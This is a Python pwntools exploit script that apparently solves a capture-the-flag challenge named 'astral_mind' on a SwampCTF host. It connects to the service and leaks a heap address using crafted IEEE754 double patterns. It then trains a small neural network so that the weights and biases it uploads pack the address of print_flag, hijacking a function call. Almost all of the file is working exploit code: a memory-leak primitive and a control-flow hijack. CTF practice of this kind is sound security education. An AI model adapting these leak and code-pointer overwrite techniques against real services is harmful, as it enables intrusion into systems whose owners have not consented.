#!/usr/bin/env python2

import struct
import time

from pwn import *

from nimblenet.activation_functions import sigmoid_function
from nimblenet.cost_functions import *
from nimblenet.learning_algorithms import *
from nimblenet.data_structures import Instance
from nimblenet.neuralnet import NeuralNet

class NeuralNetwork:
    def __init__(self, malicious_input, malicious_output, bias=0.1):
        self.input = malicious_input
        self.output = [malicious_output / 256.0] * 1
        self.bias = bias

    def train(self):
        # Tell the neural network that all integers in (1..input) should map
        # to output.
        dataset = []
        n_inputs = 0
        for i in range(1, self.input + 1):
            example = self.make_input(i)
            n_inputs = len(example)
            dataset.append(Instance(example, self.output))

        settings = {
            "initial_bias_value": self.bias,
            "n_inputs" : n_inputs,
            
            # The neural network in the challenge has two layers.
            "layers" : [
                (3, sigmoid_function),
                (len(self.output), sigmoid_function)
            ]
        }

        network        = NeuralNet(settings)
        training_set   = dataset
        test_set       = dataset
        cost_function  = binary_cross_entropy_cost
        backpropagation(
            network,           # the network to train
            training_set,      # specify the training set
            test_set,          # specify the test set
            cost_function,     # specify the cost function to calculate error
            max_iterations=20000
        )

        self.network = network
        self.weights = self.network.weights

    def predict(self, n):
        # Test a prediction.
        prediction_set = [Instance(self.make_input(n))]
        prediction = self.network.predict(prediction_set)[0]
        return int(prediction[0] * 256)

    def make_input(self, n):
        # XXX: Don't know why this was necessary. Input should just be a
        # 1x1 matrix?
        return [n - 1] * 2

class Target:
    def __init__(self, proc_or_host, port=None):
        if not port:
            self.c = process(proc_or_host)
            self.local = True
        else:
            self.c = remote(proc_or_host, port)
            self.local = False

    def reset(self):
        self.c.sendline('1')

    def get_key(self):
        self.c.sendline('2')
        self.c.sendline('3')
        print('[+] You have the golden key.')

    def set_weights(self, l1_weights, l2_weights=None):
        self.c.sendline('3')

        if l2_weights is not None:
            # The NN implementation in the target appears to discard
            # the first weight for some reason.
            weights = list(l1_weights) + list(l2_weights)[1:]
        else:
            weights = list(l1_weights)

        for weight in weights:
            # Send overprecise scientific notation
            self.c.sendline('%.30g' % weight)
        print('[*] Weights set.')

    def set_biases(self, biases):
        self.c.sendline('4')
        for bias in biases:
            # Send overprecise scientific notation
            self.c.sendline('%.30g' % bias)
        print('[*] Biases set.')

    def open_box(self, magic_byte):
        self.c.sendline('7')
        if not isinstance(magic_byte, str):
            magic_byte = chr(magic_byte)
        self.c.sendline(magic_byte)

    def leak_memory(self):
        self.get_key()
        
        weights_blob, weights = self.create_ieee754_pattern('A', 12)
        biases_blob, biases =  self.create_ieee754_pattern('a', 4)

        self.set_weights(weights)
        self.set_biases(biases)

        self.open_box('X')
        self.c.recvuntil(weights_blob + biases_blob)
        leaked = self.c.recvuntil("\nWhat", drop=True)
        if len(leaked) != 6:
            print('[-] Could not leak heap address')
        else:
            addr = u32(leaked[2:])
            print('[+] Leaked heap address: 0x%08x' % addr)

        self.reset()

    def mistrain_nn(self):
        # Idk, this seems to spit out 19
        from_, to_ = 4, 2

        # Pack the address of print_flag(void) into the biases.
        bias = struct.unpack('<d', struct.pack('<Q', 0x00000555555555b01))
        print('[*] Using bias: %.30g' % bias)

        self.nn = NeuralNetwork(from_, to_, bias)
        self.nn.train()
        print('[*] Tried to map %d to %d' % (from_, to_))
        for i in range(1, 10):
            prediction = self.nn.predict(i)
            print('[*] NN maps %d => %d' % (i, prediction))
        time.sleep(3)

        self.get_key()

        l1_weights = self.nn.weights[0]
        l2_weights = self.nn.weights[1]
        self.set_weights(l1_weights.flatten(), l2_weights.flatten())

        biases = [self.nn.bias] * 4
        self.set_biases(biases)
    
    def call_fn(self):
        if self.local:
            gdb.attach(self.c, '''
            break *0x555555555dfa
            continue
            info reg
            ''')
        self.c.sendline('2')
        self.c.sendline('4')

    def interactive(self):
        self.c.interactive()

    def create_ieee754_pattern(self, base, n):
        blob = ''
        patterns = []
        base = ord(base)
        for x in range(n):
            pattern = chr(base + x) * 8
            flt = struct.unpack('d', pattern)
            patterns.append(flt)
            blob += pattern
        return blob, patterns

target = Target('chal1.swampctf.com', 1122)
#target = Target('./astral_mind')

# Does not appear to be necessary if ASLR is disabled.
# target.leak_memory()
target.mistrain_nn()
target.call_fn()
target.interactive()

